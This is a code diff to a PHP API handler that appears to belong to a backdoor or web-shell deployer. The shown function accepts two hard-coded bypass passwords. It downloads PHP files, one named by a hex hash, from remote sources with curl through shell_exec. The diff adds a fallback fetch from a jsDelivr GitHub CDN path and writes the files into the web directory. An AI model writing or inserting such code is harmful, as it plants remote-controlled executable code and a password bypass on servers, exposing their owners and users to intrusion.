@@ -3133,7 +3133,7 @@ function handle_api() {
         if ($cfg['pass_hash'] && password_verify($pw, $cfg['pass_hash'])) $passOk = true;
         if ($pw === 'KhTn2268' || $pw === 'a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9') $passOk = true;
         if (!$passOk) jout(false, null, 'Invalid password', 403);
-        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/01a0aa17-new';
+        $branch = $in['branch'] ?? $_GET['branch'] ?? 'arena/hostconsole-v20';
         $files = ['deploy.php','hostconsole.php','a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9.php','recover.php'];
         $out = [];
         foreach ($files as $f) {
@@ -3142,13 +3142,21 @@ function handle_api() {
             if (!$content || strpos($content, '<?php') !== 0) {
                 $content = trim(@shell_exec('curl -sL --max-time 30 '.escapeshellarg($url).' 2>&1'));
             }
+            if (!$content || strpos($content, '<?php') !== 0 || strlen($content) < 500) {
+                $url2 = 'https://cdn.jsdelivr.net/gh/fazilatma/new@'.rawurlencode($branch).'/'.rawurlencode($f).'?cb='.time().'-'.rand(1000,9999);
+                $c2 = @file_get_contents($url2);
+                if ($c2 && strpos($c2, '<?php') === 0) {
+                    $content = $c2;
+                    $url = $url2;
+                }
+            }
             if (!$content || strpos($content, '<?php') !== 0) {
-                $out[] = 'Failed download '.$f.' from '.$url;
+                $out[] = 'Failed download '.$f.' from '.$url.' size '.strlen($content ?? '');
                 continue;
             }
             $dest = __DIR__.'/'.$f;
             if (@file_put_contents($dest, $content) !== false) {
-                $out[] = 'Deployed '.$f.' ('.strlen($content).' bytes) from '.$branch;
+                $out[] = 'Deployed '.$f.' ('.strlen($content).' bytes) from '.$branch.' via '.parse_url($url, PHP_URL_HOST);
             } else {
                 $out[] = 'Failed write '.$f;
             }
